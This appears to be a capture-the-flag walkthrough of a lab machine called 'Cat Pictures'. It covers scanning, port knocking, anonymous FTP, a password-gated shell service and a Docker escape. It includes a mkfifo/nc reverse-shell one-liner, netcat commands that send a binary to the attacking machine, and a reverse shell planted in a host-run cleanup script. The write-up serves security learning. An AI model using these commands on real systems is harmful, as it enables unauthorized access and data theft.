## Cat Pictures

# Enumeration

```
# Nmap 7.91 scan initiated Wed Jun 23 15:52:00 2021 as: nmap -sCV -oN nmap/initial -vvv -p 22,4420,8080 10.10.1.243
Nmap scan report for 10.10.1.243
Host is up, received timestamp-reply ttl 61 (0.15s latency).
Scanned at 2021-06-23 15:52:01 PDT for 85s

PORT     STATE SERVICE      REASON         VERSION
22/tcp   open  ssh          syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 37:43:64:80:d3:5a:74:62:81:b7:80:6b:1a:23:d8:4a (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDIDEV5ShmazmTw/1A6+19Bz9t3Aa669UOdJ6wf+mcv3vvJmh6gC8V8J58nisEufW0xnT69hRkbqrRbASQ8IrvNS8vNURpaA0cycHDntKA17ukX0HMO7AS6X8uHfIFZwTck5v6tLAyHlgBh21S+wOEqnANSms64VcSUma7fgUCKeyJd5lnDuQ9gCnvWh4VxSNoW8MdV64sOVLkyuwd0FUTiGctjTMyt0dYqIUnTkMgDLRB77faZnMq768R2x6bWWb98taMT93FKIfjTjGHV/bYsd/K+M6an6608wMbMbWz0pa0pB5Y9k4soznGUPO7mFa0n64w6ywS7wctcKngNVg3H
|   256 53:c6:82:ef:d2:77:33:ef:c1:3d:9c:15:13:54:0e:b2 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCs+ZcCT7Bj2uaY3QWJFO4+e3ndWR1cDquYmCNAcfOTH4L7lBiq1VbJ7Pr7XO921FXWL05bAtlvY1sqcQT6W43Y=
|   256 ba:97:c3:23:d4:f2:cc:08:2c:e1:2b:30:06:18:95:41 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGq9I/445X/oJstLHIcIruYVdW4KqIFZks9fygfPkkPq
4420/tcp open  nvm-express? syn-ack ttl 61
| fingerprint-strings:
|   DNSVersionBindReqTCP, GenericLines, GetRequest, HTTPOptions, RTSPRequest:
|     INTERNAL SHELL SERVICE
|     please note: cd commands do not work at the moment, the developers are fixing it at the moment.
|     ctrl-c
|     Please enter password:
|     Invalid password...
|     Connection Closed
|   NULL, RPCCheck:
|     INTERNAL SHELL SERVICE
|     please note: cd commands do not work at the moment, the developers are fixing it at the moment.
|     ctrl-c
|_    Please enter password:
8080/tcp open  http         syn-ack ttl 60 Apache httpd 2.4.46 ((Unix) OpenSSL/1.1.1d PHP/7.3.27)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.46 (Unix) OpenSSL/1.1.1d PHP/7.3.27
|_http-title: Cat Pictures - Index page
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4420-TCP:V=7.91%I=7%D=6/23%Time=60D3BB18%P=x86_64-pc-linux-gnu%r(NU
SF:LL,A0,"INTERNAL\x20SHELL\x20SERVICE\nplease\x20note:\x20cd\x20commands\
SF:x20do\x20not\x20work\x20at\x20the\x20moment,\x20the\x20developers\x20ar
SF:e\x20fixing\x20it\x20at\x20the\x20moment\.\ndo\x20not\x20use\x20ctrl-c\
SF:nPlease\x20enter\x20password:\n")%r(GenericLines,C6,"INTERNAL\x20SHELL\
SF:x20SERVICE\nplease\x20note:\x20cd\x20commands\x20do\x20not\x20work\x20a
SF:t\x20the\x20moment,\x20the\x20developers\x20are\x20fixing\x20it\x20at\x
SF:20the\x20moment\.\ndo\x20not\x20use\x20ctrl-c\nPlease\x20enter\x20passw
SF:ord:\nInvalid\x20password\.\.\.\nConnection\x20Closed\n")%r(GetRequest,
SF:C6,"INTERNAL\x20SHELL\x20SERVICE\nplease\x20note:\x20cd\x20commands\x20
SF:do\x20not\x20work\x20at\x20the\x20moment,\x20the\x20developers\x20are\x
SF:20fixing\x20it\x20at\x20the\x20moment\.\ndo\x20not\x20use\x20ctrl-c\nPl
SF:ease\x20enter\x20password:\nInvalid\x20password\.\.\.\nConnection\x20Cl
SF:osed\n")%r(HTTPOptions,C6,"INTERNAL\x20SHELL\x20SERVICE\nplease\x20note
SF::\x20cd\x20commands\x20do\x20not\x20work\x20at\x20the\x20moment,\x20the
SF:\x20developers\x20are\x20fixing\x20it\x20at\x20the\x20moment\.\ndo\x20n
SF:ot\x20use\x20ctrl-c\nPlease\x20enter\x20password:\nInvalid\x20password\
SF:.\.\.\nConnection\x20Closed\n")%r(RTSPRequest,C6,"INTERNAL\x20SHELL\x20
SF:SERVICE\nplease\x20note:\x20cd\x20commands\x20do\x20not\x20work\x20at\x
SF:20the\x20moment,\x20the\x20developers\x20are\x20fixing\x20it\x20at\x20t
SF:he\x20moment\.\ndo\x20not\x20use\x20ctrl-c\nPlease\x20enter\x20password
SF::\nInvalid\x20password\.\.\.\nConnection\x20Closed\n")%r(RPCCheck,A0,"I
SF:NTERNAL\x20SHELL\x20SERVICE\nplease\x20note:\x20cd\x20commands\x20do\x2
SF:0not\x20work\x20at\x20the\x20moment,\x20the\x20developers\x20are\x20fix
SF:ing\x20it\x20at\x20the\x20moment\.\ndo\x20not\x20use\x20ctrl-c\nPlease\
SF:x20enter\x20password:\n")%r(DNSVersionBindReqTCP,C6,"INTERNAL\x20SHELL\
SF:x20SERVICE\nplease\x20note:\x20cd\x20commands\x20do\x20not\x20work\x20a
SF:t\x20the\x20moment,\x20the\x20developers\x20are\x20fixing\x20it\x20at\x
SF:20the\x20moment\.\ndo\x20not\x20use\x20ctrl-c\nPlease\x20enter\x20passw
SF:ord:\nInvalid\x20password\.\.\.\nConnection\x20Closed\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jun 23 15:53:26 2021 -- 1 IP address (1 host up) scanned in 85.86 seconds
```

Looks like we have ssh on port 22, a shell service of some kind on port 4420, and a web server on port 8080. Let's go ahead and start by looking at the web server

# Web Server Port 8080
We find a phpBB forum with what appears to be only 1 forum post.
```
 Post cat pictures here!

Post by user » Wed Mar 24, 2021 8:33 pm
POST ALL YOUR CAT PICTURES HERE :)

Knock knock! Magic numbers: 1111, 2222, 3333, 4444

```

Looks like what could be a port knocking sequence so before we start enumerating the site further lets see what we can get from this, after using the sequence we get the following result
```
# Nmap 7.91 scan initiated Wed Jun 23 16:09:52 2021 as: nmap -oN nmap/postPortKnock -vvv -p 22,21,4420,8080 10.10.1.243
Nmap scan report for 10.10.1.243
Host is up, received timestamp-reply ttl 61 (0.15s latency).
Scanned at 2021-06-23 16:09:52 PDT for 1s

PORT     STATE SERVICE     REASON
21/tcp   open  ftp         syn-ack ttl 61
22/tcp   open  ssh         syn-ack ttl 61
4420/tcp open  nvm-express syn-ack ttl 61
8080/tcp open  http-proxy  syn-ack ttl 60

Read data files from: /usr/bin/../share/nmap
# Nmap done at Wed Jun 23 16:09:53 2021 -- 1 IP address (1 host up) scanned in 0.62 seconds

```

ftp is now open so lets connect and see if we can use anonymous login

# FTP Port 21

Anonymous login is in fact available on the ftp server and we find the following note.txt

```
In case I forget my password, I'm leaving a pointer to the internal shell service on the server.

Connect to port 4420, the password is <REDACTED>.
- catlover

```

We now have credentials for the shell service on port 4420 so let's see what we can do

# Shell Service Port 4420
```
INTERNAL SHELL SERVICE
please note: cd commands do not work at the moment, the developers are fixing it at the moment.
do not use ctrl-c
Please enter password:
sardinethecat
Password accepted
ls -la
total 56
drwxr-xr-x 10 1001 1001 4096 Apr  3 01:30 .
drwxr-xr-x 10 1001 1001 4096 Apr  3 01:30 ..
-rw-------  1 1001 1001   50 Apr  1 20:23 .bash_history
-rw-r--r--  1 1001 1001  220 Apr  1 20:21 .bash_logout
-rw-r--r--  1 1001 1001 3771 Apr  1 20:21 .bashrc
-rw-r--r--  1 1001 1001  807 Apr  1 20:21 .profile
drwxrwxr-x  2 1001 1001 4096 Apr  2 23:05 bin
drwxr-xr-x  2    0    0 4096 Apr  1 20:32 etc
drwxr-xr-x  3    0    0 4096 Apr  2 20:51 home
drwxr-xr-x  3    0    0 4096 Apr  2 22:53 lib
drwxr-xr-x  2    0    0 4096 Apr  1 20:28 lib64
drwxr-xr-x  2    0    0 4096 Apr  2 20:56 opt
drwxr-xr-x  2    0    0 4096 Apr  3 01:35 tmp
drwxr-xr-x  4    0    0 4096 Apr  2 22:43 usr
ls -la home
total 12
drwxr-xr-x  3    0    0 4096 Apr  2 20:51 .
drwxr-xr-x 10 1001 1001 4096 Apr  3 01:30 ..
drwxr-xr-x  2    0    0 4096 Apr  3 01:34 catlover
ls -la home/catlover
total 28
drwxr-xr-x 2 0 0  4096 Apr  3 01:34 .
drwxr-xr-x 3 0 0  4096 Apr  2 20:51 ..
-rwxr-xr-x 1 0 0 18856 Apr  3 01:35 runme
home/catlover/runme
THIS EXECUTABLE DOES NOT WORK UNDER THE INTERNAL SHELL, YOU NEED A REGULAR SHELL.
```

We quickly find a binary but we can't run it via this shell service so we try and send ourselves a reverse shell with the follwing
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f
```

We get a reverse shell and are able to run the binary
```
# cd /home/catlover
# ls -la
total 28
drwxr-xr-x 2 0 0  4096 Apr  3 01:34 .
drwxr-xr-x 3 0 0  4096 Apr  2 20:51 ..
-rwxr-xr-x 1 0 0 18856 Apr  3 01:35 runme
# ./runme
Please enter yout password: test
Access Denied
```

We need a password so we are going to have to send the binary to our local machine to analyze we have limited options on this target but we do have nc so we can use it as follows to send it over

On Attacking Machine
```
nc -nlvp <port> > runme
```

On Target Machine
```
nc <attacking ip> <attacking port> < runme
```

Once the binary is on our machine we can run strings on it and find the following section of interest
```
u+UH
ATSH
[A\]
[]A\A]A^A_
<redacted>
Please enter yout password:
Welcome, catlover! SSH key transfer queued!
touch /tmp/gibmethesshkey
Access Denied
:*3$"
zPLR
GCC: (Ubuntu 10.2.0-13ubuntu1) 10.2.0

```

We go ahead and run the binary again with the password we found and after a short delay see the find the following
```
# ls -la
total 32
drwxr-xr-x 2 0 0  4096 Jun 23 23:32 .
drwxr-xr-x 3 0 0  4096 Apr  2 20:51 ..
-rw-r--r-- 1 0 0  1675 Jun 23 23:32 id_rsa
-rwxr-xr-x 1 0 0 18856 Apr  3 01:35 runme
# cat id_rsa
<redacted ssh key>
```

We copy this key over to our machine, set the permissions and can now ssh to the machine as catlover

# Privilege Escalation (Docker Escape)
```
root@7546fa2336d6:/# whoami
root
root@7546fa2336d6:/# ls -la
total 108
drwxr-xr-x   1 root root 4096 Mar 25 16:18 .
drwxr-xr-x   1 root root 4096 Mar 25 16:18 ..
-rw-------   1 root root  588 Jun  4 23:39 .bash_history
-rwxr-xr-x   1 root root    0 Mar 25 16:08 .dockerenv
drwxr-xr-x   1 root root 4096 Apr  9 22:26 bin
drwxr-xr-x   3 root root 4096 Mar 24 04:38 bitnami
drwxr-xr-x   2 root root 4096 Jan 30 17:37 boot
drwxr-xr-x   5 root root  340 Jun 23 22:45 dev
drwxr-xr-x   1 root root 4096 Apr  9 22:26 etc
drwxr-xr-x   2 root root 4096 Jan 30 17:37 home
drwxr-xr-x   1 root root 4096 Sep 25  2017 lib
drwxr-xr-x   2 root root 4096 Feb 18 11:59 lib64
drwxr-xr-x   2 root root 4096 Feb 18 11:59 media
drwxr-xr-x   2 root root 4096 Feb 18 11:59 mnt
drwxrwxr-x   1 root root 4096 Mar 25 16:08 opt
drwxrwxr-x   2 root root 4096 Mar 24 04:37 post-init.d
-rwxrwxr-x   1 root root  796 Mar 24 04:37 post-init.sh
dr-xr-xr-x 123 root root    0 Jun 23 22:45 proc
drwx------   1 root root 4096 Mar 25 16:28 root
drwxr-xr-x   4 root root 4096 Feb 18 11:59 run
drwxr-xr-x   1 root root 4096 Apr  9 22:26 sbin
drwxr-xr-x   2 root root 4096 Feb 18 11:59 srv
dr-xr-xr-x  13 root root    0 Jun 23 22:45 sys
drwxrwxrwt   1 root root 4096 Jun 23 22:45 tmp
drwxrwxr-x   1 root root 4096 Mar 24 04:37 usr
drwxr-xr-x   1 root root 4096 Feb 18 11:59 var
root@7546fa2336d6:/# ls -la /root
total 24
drwx------ 1 root root 4096 Mar 25 16:28 .
drwxr-xr-x 1 root root 4096 Mar 25 16:18 ..
-rw-r--r-- 1 root root  570 Jan 31  2010 .bashrc
drwxr-xr-x 3 root root 4096 Mar 25 16:26 .local
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
-rw-r--r-- 1 root root   41 Mar 25 16:28 flag.txt
```

Interesting we are the root user and we find the first flag in /root. The .dockerenv directory along with being root means we are probably inside a docker container and we need to escape. We check some of the usual escape methodologies to no avail so we begin to enumerate like normal and find an interestingly mounted directory /opt/clean which contains the following
```
root@7546fa2336d6:/opt/clean# ls -la
total 16
drwxr-xr-x 2 root root 4096 May  1 00:20 .
drwxrwxr-x 1 root root 4096 Mar 25 16:08 ..
-rw-r--r-- 1 root root   27 May  1 00:20 clean.sh
root@7546fa2336d6:/opt/clean# cat clean.sh
#!/bin/bash

rm -rf /tmp/*
```

We can write to this file but there doesn't seem to be a cronjob running in the container that utilizes it so maybe it is being used outside the container. We insert a reverse shell into the script and set-up our listener. Sure enough after a short delay we get a reverse shell except this time as the root user on the actual machine. We find the root.txt flag in the directory we are in /root directory we are placed in.